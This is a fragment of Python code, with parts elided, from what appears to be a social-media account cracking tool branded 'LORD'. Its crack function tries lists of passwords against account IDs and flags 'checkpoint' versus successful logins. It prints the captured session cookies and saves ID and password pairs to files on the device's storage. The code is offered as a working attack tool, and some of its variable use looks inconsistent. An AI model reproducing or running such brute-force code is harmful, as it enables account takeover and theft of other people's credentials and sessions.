...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[LORD•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[LORD•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mLORD-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/LORD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;92mLORD-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🍪]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[LORD\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🍪]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " LORD,  Ok,  id"')
                open('/sdcard/LORD-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
